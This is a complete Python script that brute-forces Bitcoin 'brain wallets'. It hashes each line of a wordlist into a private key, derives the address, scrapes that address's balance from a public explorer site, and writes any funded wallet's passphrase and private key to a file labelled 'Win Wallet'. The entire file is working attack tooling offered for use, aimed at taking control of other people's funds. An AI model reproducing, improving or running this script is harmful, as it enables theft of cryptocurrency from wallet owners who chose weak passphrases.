import os
import time
import asyncio
import aiohttp
import aiofiles
import hashlib
import codecs
import ecdsa
import logging
from lxml import html
from rich.console import Console
from rich.panel import Panel

# Initialize Rich console for colorful output
console = Console()

class CustomFormatter(logging.Formatter):
    def format(self, record):
        if record.msg == "START_LOGGING":
            return f"\n{record.getMessage()}"
        return super().format(record)


# Initialize logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s', filename='output.log')
# Get the root logger and add the console handler
logger = logging.getLogger()

# Add a handler to output logs to console as well
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
logger.addHandler(console_handler)

# Add a custom formatter to the console handler
console_formatter = CustomFormatter()
console_handler.setFormatter(console_formatter)


# Function to fetch balance of a Bitcoin address asynchronously
async def fetch_balance(address, session):
    logger.debug(f"Fetching balance for address: {address}")
    url = f"https://bitcoin.atomicwallet.io/address/{address}"
    async with session.get(url) as response:
        content = await response.text()
        tree = html.fromstring(content)
        xpath_balance = '/html/body/main/div/div[2]/div[1]/table/tbody/tr[3]/td[2]'
        balance = tree.xpath(xpath_balance)[0].text_content()
        logger.debug(f"Balance for address {address}: {balance}")
        return balance


# Function to generate Bitcoin address from passphrase
def generate_address(passphrase):
    private_key = hashlib.sha256(passphrase.encode('utf-8')).hexdigest()
    public_key = __private_to_public(private_key)
    address = __public_to_address(public_key)
    return private_key, address

# Helper functions for address generation
def __private_to_public(private_key):
    private_key_bytes = codecs.decode(private_key, 'hex')
    key = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1).verifying_key
    key_bytes = key.to_string()
    key_hex = codecs.encode(key_bytes, 'hex')
    bitcoin_byte = b'04'
    public_key = bitcoin_byte + key_hex
    return public_key

def __public_to_address(public_key):
    public_key_bytes = codecs.decode(public_key, 'hex')
    sha256_bpk = hashlib.sha256(public_key_bytes)
    sha256_bpk_digest = sha256_bpk.digest()
    ripemd160_bpk = hashlib.new('ripemd160')
    ripemd160_bpk.update(sha256_bpk_digest)
    ripemd160_bpk_digest = ripemd160_bpk.digest()
    ripemd160_bpk_hex = codecs.encode(ripemd160_bpk_digest, 'hex')
    network_byte = b'00'
    network_bitcoin_public_key = network_byte + ripemd160_bpk_hex
    network_bitcoin_public_key_bytes = codecs.decode(network_bitcoin_public_key, 'hex')
    sha256_nbpk = hashlib.sha256(network_bitcoin_public_key_bytes)
    sha256_nbpk_digest = sha256_nbpk.digest()
    sha256_2_nbpk = hashlib.sha256(sha256_nbpk_digest)
    sha256_2_nbpk_digest = sha256_2_nbpk.digest()
    sha256_2_hex = codecs.encode(sha256_2_nbpk_digest, 'hex')
    checksum = sha256_2_hex[:8]
    address_hex = (network_bitcoin_public_key + checksum).decode('utf-8')
    return base58(address_hex)

# Function for base58 encoding
def base58(address_hex):
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    b58_string = ''
    leading_zeros = len(address_hex) - len(address_hex.lstrip('0'))
    address_int = int(address_hex, 16)
    while address_int > 0:
        digit = address_int % 58
        digit_char = alphabet[digit]
        b58_string = digit_char + b58_string
        address_int //= 58
    ones = leading_zeros // 2
    for one in range(ones):
        b58_string = '1' + b58_string
    return b58_string

# Function to process a batch of passphrases
async def process_batch(passphrase_batch, session):
    batch_results = []
    for passphrase in passphrase_batch:
        private_key, address = generate_address(passphrase)
        logger.debug(f"Processing passphrase: {passphrase}, Address: {address}, Private Key: {private_key}")
        retries = 2  # Number of retries
        while retries > 0:
            try:
                balance = await fetch_balance(address, session)
                batch_results.append((private_key, address, balance, passphrase))
                break  # Exit the loop if request succeeds
            except Exception as e:
                logger.error(f"Error processing passphrase: {passphrase}, Error: {str(e)}")
                retries -= 1
                if retries == 0:
                    logger.warning(f"Max retries exceeded for passphrase: {passphrase}. Skipping.")
                    break  # Exit the loop if max retries exceeded
                logger.warning(f"Retrying for passphrase: {passphrase}. Retries left: {retries}")
                await asyncio.sleep(1)  # Wait for a moment before retrying
    return batch_results


# Main function to handle input and initiate processing
async def main():
    folder_path = "Words"
    logger.info(f"Looking for text files in folder: {folder_path}")

    # Get list of text files in the folder
    text_files = [f for f in os.listdir(folder_path) if f.endswith('.txt')]
    logger.info(f"Found {len(text_files)} text files: {text_files}")

    # Close all previous client sessions
    await aiohttp.ClientSession().close()

    # Process each text file
    for file_name in text_files:
        logger.info(f"START_LOGGING")  # Log the start of processing for better readability
        logger.info(f"Processing file: {file_name}")
        async with aiofiles.open(os.path.join(folder_path, file_name), "r", encoding="utf-8") as file:
            contents = await file.read()  # Await the coroutine
            passphrase_list = contents.splitlines()  # Split the contents into lines

        # Define batch size
        batch_size = 100000

        # Create a session for making asynchronous requests
        async with aiohttp.ClientSession() as session:
            processed_batches = 0
            non_zero_balances = 0
            for i in range(0, len(passphrase_list), batch_size):
                start_time = time.time()  
                batch = passphrase_list[i:i + batch_size]
                batch_results = await process_batch(batch, session)
                processed_batches += 1  
                end_time = time.time()
                batch_time = end_time - start_time
                logger.info(f"Time taken for Batch No. {processed_batches}: {batch_time} seconds")
                # Process results and display output using Rich
                with open('found.txt', 'a') as found_file:
                    for private_key, address, balance, passphrase in batch_results:
                        if float(balance.split()[0]) > 0:
                            non_zero_balances += 1
                            # Print the information
                            console.print(Panel(f"Address: {address}\nPassphrase: {passphrase}\nPrivate Key: {private_key}\nBalance: {balance}", title="[bold green]Win Wallet[/]"))
                            # Log the information
                            logger.info(f"Address: {address}, Passphrase: {passphrase}, Private Key: {private_key}, Balance: {balance}")
                            # Write the information to the found.txt file
                            found_file.write(f"Address: {address}\nPassphrase: {passphrase}\nPrivate Key: {private_key}\nBalance: {balance}\n\n")
                    if non_zero_balances == 0:
                        logger.info(f"No balance for Batch No: {processed_batches}")

# Run the main function 
asyncio.run(main())
